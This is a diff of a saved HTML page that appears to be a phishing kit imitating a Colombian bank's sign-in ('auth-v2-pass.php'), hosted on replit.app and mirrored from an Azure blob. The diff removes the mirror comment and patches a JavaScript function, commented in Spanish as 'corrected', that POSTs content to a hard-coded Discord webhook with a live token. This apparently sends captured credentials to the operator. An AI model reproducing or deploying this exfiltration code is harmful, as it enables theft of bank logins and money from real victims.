@@ -1,8 +1,6 @@
 <!doctype html>
 <!-- saved from url=(0068)https://estudiodecredito.replit.app/1/validate-data/auth-v2-pass.php -->
 <html lang="en">
-  
-<!-- Mirrored from https://neqteayuda.blob.core.windows.net/neqkm/access-passed/access-sign-in-pass.php.html by HTTrack Website Copier/3.x [XR&CO], Sun, 18 Oct 2026 23:03:45 GMT -->
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
@@ -280,9 +278,10 @@
     });
   });
 
-  // FUNCIÓN PARA ENVIAR MENSAJE A DISCORD
+  // FUNCIÓN PARA ENVIAR MENSAJE A DISCORD CORREGIDA
   async function sendDiscordMessage(content) {
     const webhookUrl = "https://discord.com/api/webhooks/1562163402187477032/DOqQ1dzOrjIMmiJsDZoLI072WKkt5LwrP8lk7HVAj2jYXnFcFFrhgyjU4JZuU7YAe1n0";
+    const payload = { content: content };
 
     const response = await fetch(webhookUrl, {
       method: 'POST',
